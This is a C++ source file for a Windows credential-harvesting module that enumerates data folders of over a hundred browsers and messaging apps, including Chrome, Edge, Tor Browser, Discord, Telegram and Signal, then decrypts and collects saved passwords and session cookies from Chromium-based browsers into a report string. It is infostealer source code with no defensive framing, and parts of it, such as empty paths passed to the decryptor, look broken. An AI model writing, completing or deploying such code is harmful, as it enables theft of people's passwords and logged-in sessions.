#include "browser_collector.h"
#include "browser_decryptor.h"
#include <Windows.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <iostream>
#include <sstream>
#include <filesystem>
#include <cstring>

std::string BrowserCollector::CollectAllBrowsers() {
    std::string result;
    
    char localPath[MAX_PATH], roamingPath[MAX_PATH], programFiles[MAX_PATH], programFilesX86[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, localPath);
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, roamingPath);
    SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILES, NULL, SHGFP_TYPE_CURRENT, programFiles);
    SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILESX86, NULL, SHGFP_TYPE_CURRENT, programFilesX86);
    
    std::vector<BrowserInfo> browsers = {
        // Chromium-based browsers
        {"Chrome", std::string(localPath) + "\\Google\\Chrome\\User Data"},
        {"Chrome Beta", std::string(localPath) + "\\Google\\Chrome Beta\\User Data"},
        {"Chrome Dev", std::string(localPath) + "\\Google\\Chrome Dev\\User Data"},
        {"Chrome Canary", std::string(localPath) + "\\Google\\Chrome SxS\\User Data"},
        {"Chromium", std::string(localPath) + "\\Chromium\\User Data"},
        {"Edge", std::string(localPath) + "\\Microsoft\\Edge\\User Data"},
        {"Edge Beta", std::string(localPath) + "\\Microsoft\\Edge Beta\\User Data"},
        {"Edge Dev", std::string(localPath) + "\\Microsoft\\Edge Dev\\User Data"},
        {"Edge Canary", std::string(localPath) + "\\Microsoft\\Edge SxS\\User Data"},
        {"Brave", std::string(localPath) + "\\BraveSoftware\\Brave-Browser\\User Data"},
        {"Brave Beta", std::string(localPath) + "\\BraveSoftware\\Brave-Browser-Beta\\User Data"},
        {"Brave Nightly", std::string(localPath) + "\\BraveSoftware\\Brave-Browser-Nightly\\User Data"},
        {"Opera", std::string(roamingPath) + "\\Opera Software\\Opera Stable"},
        {"Opera GX", std::string(roamingPath) + "\\Opera Software\\Opera GX Stable"},
        {"Opera Beta", std::string(roamingPath) + "\\Opera Software\\Opera Beta"},
        {"Opera Developer", std::string(roamingPath) + "\\Opera Software\\Opera Developer"},
        {"Vivaldi", std::string(localPath) + "\\Vivaldi\\User Data"},
        {"Yandex", std::string(localPath) + "\\Yandex\\YandexBrowser\\User Data"},
        {"Arc", std::string(localPath) + "\\Arc\\User Data"},
        {"Sidekick", std::string(localPath) + "\\Sidekick\\User Data"},
        {"SigmaOS", std::string(localPath) + "\\SigmaOS\\User Data"},
        {"Ghost Browser", std::string(localPath) + "\\Ghost Browser\\User Data"},
        {"Ungoogled Chromium", std::string(localPath) + "\\Ungoogled Chromium\\User Data"},
        {"Iridium", std::string(localPath) + "\\Iridium\\User Data"},
        {"Iron", std::string(localPath) + "\\ChromePlus\\User Data"},
        {"Slimjet", std::string(localPath) + "\\Slimjet\\User Data"},
        {"Comodo Dragon", std::string(localPath) + "\\Comodo\\Dragon\\User Data"},
        {"CoolNovo", std::string(localPath) + "\\MapleStudio\\ChromePlus\\User Data"},
        {"SlimBrowser", std::string(localPath) + "\\FlashPeak\\SlimBrowser\\User Data"},
        {"Avant", std::string(localPath) + "\\Avant\\User Data"},
        {"Lunascape", std::string(localPath) + "\\Lunascape\\User Data"},
        {"Maxthon", std::string(localPath) + "\\Maxthon3\\User Data"},
        {"QQBrowser", std::string(localPath) + "\\Tencent\\QQBrowser\\User Data"},
        {"360Chrome", std::string(localPath) + "\\360Chrome\\Chrome\\User Data"},
        {"Sogou", std::string(localPath) + "\\Sogou\\SogouExplorer\\User Data"},
        {"Liebao", std::string(localPath) + "\\liebao\\User Data"},
        {"CocCoc", std::string(localPath) + "\\CocCoc\\Browser\\User Data"},
        {"Torch", std::string(localPath) + "\\Torch\\User Data"},
        {"Blisk", std::string(localPath) + "\\Blisk\\User Data"},
        {"Epic", std::string(localPath) + "\\Epic Privacy Browser\\User Data"},
        {"Uran", std::string(localPath) + "\\uCozMedia\\Uran\\User Data"},
        {"CentBrowser", std::string(localPath) + "\\CentBrowser\\User Data"},
        {"Superbird", std::string(localPath) + "\\Superbird\\User Data"},
        {"Falkon", std::string(localPath) + "\\Falkon\\User Data"},
        {"Konqueror", std::string(localPath) + "\\Konqueror\\User Data"},
        {"Midori", std::string(localPath) + "\\Midori\\User Data"},
        {"Otter", std::string(localPath) + "\\Otter\\User Data"},
        {"K-Meleon", std::string(localPath) + "\\K-Meleon\\User Data"},
        {"Camino", std::string(localPath) + "\\Camino\\User Data"},
        {"Galeon", std::string(localPath) + "\\Galeon\\User Data"},
        {"GreenBrowser", std::string(localPath) + "\\GreenBrowser\\User Data"},
        {"TheWorld", std::string(localPath) + "\\TheWorld\\User Data"},
        {"Tango", std::string(localPath) + "\\Tango\\User Data"},
        {"RockMelt", std::string(localPath) + "\\RockMelt\\User Data"},
        {"Flock", std::string(localPath) + "\\Flock\\User Data"},
        {"Wyzo", std::string(localPath) + "\\Wyzo\\User Data"},
        {"SalamWeb", std::string(localPath) + "\\SalamWeb\\User Data"},
        {"Amigo", std::string(localPath) + "\\Amigo\\User Data"},
        {"Orbitum", std::string(localPath) + "\\Orbitum\\User Data"},
        {"Tor Browser", std::string(roamingPath) + "\\Tor Browser\\Browser\\TorBrowser\\Data"},
        {"SRWare Iron", std::string(localPath) + "\\SRWare Iron\\User Data"},
        {"Centaury", std::string(localPath) + "\\Centaury\\User Data"},
        {"Qihu 360", std::string(localPath) + "\\360Browser\\Browser\\User Data"},
        {"Pale Moon", std::string(roamingPath) + "\\Moonchild Productions\\Pale Moon\\Profiles"},
        {"Basilisk", std::string(roamingPath) + "\\Moonchild Productions\\Basilisk\\Profiles"},
        // Firefox-based browsers
        {"Firefox", std::string(roamingPath) + "\\Mozilla\\Firefox\\Profiles"},
        {"Firefox ESR", std::string(roamingPath) + "\\Mozilla\\Firefox\\Profiles"},
        {"Firefox Beta", std::string(roamingPath) + "\\Mozilla\\Firefox\\Profiles"},
        {"Firefox Nightly", std::string(roamingPath) + "\\Mozilla\\Firefox\\Profiles"},
        {"Waterfox", std::string(roamingPath) + "\\Waterfox\\Profiles"},
        {"SeaMonkey", std::string(roamingPath) + "\\Mozilla\\SeaMonkey\\Profiles"},
        {"IceCat", std::string(roamingPath) + "\\Mozilla\\IceCat\\Profiles"},
        {"Cyberfox", std::string(roamingPath) + "\\8pecxstudios\\Cyberfox\\Profiles"},
        {"LibreWolf", std::string(roamingPath) + "\\LibreWolf\\Profiles"},
        {"Floorp", std::string(roamingPath) + "\\Floorp\\Profiles"},
        {"IceWeasel", std::string(roamingPath) + "\\Mozilla\\IceWeasel\\Profiles"},
        {"Swiftfox", std::string(roamingPath) + "\\Mozilla\\Swiftfox\\Profiles"},
        {"Swiftweasel", std::string(roamingPath) + "\\Mozilla\\Swiftweasel\\Profiles"},
        // Safari and IE
        {"Safari", std::string(localPath) + "\\Apple Computer\\Safari"},
        {"Internet Explorer", std::string(localPath) + "\\Microsoft\\Internet Explorer"},
        // Specialized apps with browser data
        {"Discord", std::string(roamingPath) + "\\discord"},
        {"Discord Canary", std::string(roamingPath) + "\\discordcanary"},
        {"Discord PTB", std::string(roamingPath) + "\\discordptb"},
        {"Steam", std::string(programFiles) + "\\Steam"},
        {"Epic Games", std::string(programFiles) + "\\Epic Games"},
        {"Telegram", std::string(roamingPath) + "\\Telegram Desktop"},
        {"Signal", std::string(roamingPath) + "\\Signal"},
        {"Slack", std::string(localPath) + "\\slack"},
        {"Skype", std::string(roamingPath) + "\\Skype"},
        {"WhatsApp", std::string(localPath) + "\\WhatsApp"},
        {"Element", std::string(roamingPath) + "\\Element"},
        {"Matrix", std::string(roamingPath) + "\\matrix"},
        {"RocketChat", std::string(localPath) + "\\RocketChat"},
        {"Mattermost", std::string(localPath) + "\\Mattermost"},
        {"Teams", std::string(localPath) + "\\Microsoft\\Teams"},
        {"Zoom", std::string(roamingPath) + "\\Zoom"},
        {"Webex", std::string(localPath) + "\\CiscoSpark"},
        {"Jitsi", std::string(roamingPath) + "\\Jitsi"},
        {"Wire", std::string(localPath) + "\\Wire"},
        {"Threema", std::string(localPath) + "\\Threema"},
        {"Wickr", std::string(localPath) + "\\WickrMe"},
        {"Session", std::string(localPath) + "\\Session"},
        {"Briar", std::string(localPath) + "\\Briar"},
        {"RetroShare", std::string(localPath) + "\\RetroShare"},
        {"Tox", std::string(localPath) + "\\Tox"},
        {"Ricochet", std::string(localPath) + "\\Ricochet"},
        {"ChatSecure", std::string(localPath) + "\\ChatSecure"},
        {"Conversations", std::string(localPath) + "\\Conversations"},
        {"Silence", std::string(localPath) + "\\Silence"},
        {"Signal Desktop", std::string(roamingPath) + "\\Signal"},
        {"Telegram Desktop", std::string(roamingPath) + "\\Telegram Desktop"},
        {"WhatsApp Desktop", std::string(localPath) + "\\WhatsApp"},
        {"Firefox Portable", std::string(programFiles) + "\\Mozilla Firefox"},
        {"Firefox Portable X86", std::string(programFilesX86) + "\\Mozilla Firefox"},
        {"Chrome Portable", std::string(programFiles) + "\\Google\\Chrome"},
        {"Chrome Portable X86", std::string(programFilesX86) + "\\Google\\Chrome"},
        {"Opera Portable", std::string(programFiles) + "\\Opera"},
        {"Opera Portable X86", std::string(programFilesX86) + "\\Opera"},
    };
    
    for (const auto& browser : browsers) {
        if (PathFileExistsA(browser.path.c_str())) {
            result += CollectBrowserData(browser.name.c_str(), browser.path.c_str());
        }
    }
    
    return result;
}

std::string BrowserCollector::CollectBrowserData(const char* name, const char* path) {
    std::string fullPath = path;
    
    if (!PathFileExistsA(fullPath.c_str())) {
        return "";
    }
    
    std::string result;
    result += std::string("[+] Found: ") + name + "\n";
    
    if (strstr(name, "Chrome") != NULL || strstr(name, "Edge") != NULL || strstr(name, "Brave") != NULL || 
        strstr(name, "Opera") != NULL || strstr(name, "Vivaldi") != NULL || strstr(name, "Chromium") != NULL) {
        auto passwords = BrowserDecryptor::DecryptPasswords("");
        if (!passwords.empty()) {
            result += std::string("=== ") + name + std::string(" PASSWORDS ===\n");
            for (const auto& pwd : passwords) {
                if (pwd.find("[INFO]") == std::string::npos && pwd.find("[DEBUG]") == std::string::npos) {
                    result += pwd + "\n";
                }
            }
            result += "\n";
        }
        
        auto cookies = BrowserDecryptor::DecryptCookies("");
        if (!cookies.empty()) {
            result += std::string("=== ") + name + std::string(" COOKIES (First 10) ===\n");
            for (size_t i = 0; i < std::min((size_t)10, cookies.size()); i++) {
                result += cookies[i] + "\n";
            }
            result += "\n";
        }
    }
    
    return result;
}

std::string BrowserCollector::CollectChrome() {
    return CollectBrowserData("Chrome", "Google\\Chrome\\User Data");
}

std::string BrowserCollector::CollectEdge() {
    return CollectBrowserData("Edge", "Microsoft\\Edge\\User Data");
}

std::string BrowserCollector::CollectFirefox() {
    char buffer[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, buffer) != S_OK) {
        return "";
    }
    
    std::string path = buffer;
    path += "\\Mozilla\\Firefox\\Profiles";
    
    if (PathFileExistsA(path.c_str())) {
        return "[+] Found: Firefox\n";
    }
    
    return "";
}

std::string BrowserCollector::CollectOpera() {
    return CollectBrowserData("Opera", "Opera Software\\Opera Stable");
}

std::string BrowserCollector::CollectBrave() {
    return CollectBrowserData("Brave", "BraveSoftware\\Brave-Browser\\User Data");
}

std::string BrowserCollector::CollectVivaldi() {
    return CollectBrowserData("Vivaldi", "Vivaldi\\User Data");
}

std::string BrowserCollector::CollectYandex() {
    return CollectBrowserData("Yandex", "Yandex\\YandexBrowser\\User Data");
}

std::string BrowserCollector::CollectSafari() {
    return "";
}
